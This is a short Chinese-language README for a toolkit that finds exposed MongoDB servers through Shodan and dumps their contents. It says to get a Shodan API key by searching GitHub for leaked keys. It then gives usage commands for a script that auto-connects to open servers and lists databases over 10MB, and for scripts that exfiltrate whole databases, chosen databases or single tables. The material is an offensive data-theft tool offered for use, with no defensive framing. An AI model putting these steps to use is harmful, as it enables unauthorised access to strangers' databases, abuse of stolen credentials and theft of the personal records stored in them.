# 准备工作
pip3 install pymongo
pip3 install shodan

shodan init SHODAN_API_KEY #没有账号的可以到github泄露文件去找,搜索关键词 SHODAN_API_KEY
shodan info  #查看是否还有足够的查询次数,不是0就行

# 食用方法
### 自动从shodan获取开放MongoDB信息并尝试连接，输出数据库大小大于10M的数据库地址和数据库名
./mongodb.sh

#脱裤脚本
### 拖所有数据库
mgtool/data.py
    data.py 127.0.0.1

### 拖指定数据库
mgtool/db.py
    db.py 127.0.0.1 users

### 拖指定表
mgtool/table.py
    table.py 127.0.0.1 users addres

### 指定数据库不脱 需要修改脚本
mgtool/data_filter.py
    data_filter.py 127.0.0.1